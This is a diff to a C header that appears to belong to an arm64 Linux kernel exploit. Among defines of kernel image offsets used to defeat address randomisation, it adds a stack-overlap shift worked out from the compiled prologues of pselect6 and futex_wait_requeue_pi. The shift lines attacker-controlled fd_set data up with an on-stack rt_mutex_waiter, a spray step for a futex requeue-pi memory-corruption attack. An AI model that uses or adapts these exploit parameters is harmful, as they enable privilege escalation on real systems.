@@ -157,6 +157,31 @@
 #define SLIDE_ROOT_TASK_GROUP_OFF   ROOT_TASK_GROUP_OFF
 #define SLIDE_SYSCTL_BOOTID_OFF     0x0227b498ULL
 
+// DIVERGENCE: overrides slide.c's 0, which is the 6.6 value. This is not a
+// symbol or a struct offset — it is where futex_wait_requeue_pi's on-stack
+// rt_mutex_waiter lands relative to core_sys_select's stack_fds array, both
+// measured from the same syscall-entry sp, so it falls out of this kernel's
+// compiled stack frames. Read off the prologues of this image:
+//
+//   __arm64_sys_pselect6    sub sp, sp, #0x90
+//   core_sys_select         sub sp, sp, #0x1c0 ; add x23, sp, #0x50  <- bits
+//     => fd_sets   = sp_entry - 0x90 - 0x1c0 + 0x50  = sp_entry - 0x200
+//
+//   __arm64_sys_futex       sub sp, sp, #0x70
+//   do_futex                sub sp, sp, #0x60
+//   futex_wait_requeue_pi   sub sp, sp, #0x1b0 ; add x2, sp, #0x98   <- rt_waiter
+//     (confirmed twice: same sp+0x98 is passed to rt_mutex_wait_proxy_lock
+//      as its waiter argument and to rt_mutex_cleanup_proxy_lock)
+//     => rt_waiter = sp_entry - 0x70 - 0x60 - 0x1b0 + 0x98 = sp_entry - 0x1e8
+//
+//   shift = (0x200 - 0x1e8) / 8 = 3 words
+//
+// All five frames are fixed-size with a single prologue adjustment, so there
+// is no dynamic stack sizing to account for. With the waiter being 0x58 bytes
+// (11 words), words 3..13 are used, which still lands inside in/out/ex
+// (words 0..14) and never reaches the res_* half that core_sys_select memsets.
+#define SLIDE_PSELECT_WORD_SHIFT 3
+
 #define SLIDE_NFULNL_LOGGER_IMAGE (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)
 #define SLIDE_LOGGERS_0_1_IMAGE (KIMAGE_TEXT_BASE + SLIDE_LOGGERS_0_1_OFF)
 #define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE (KIMAGE_TEXT_BASE + SLIDE_RANDOM_BOOT_ID_DATA_OFF)
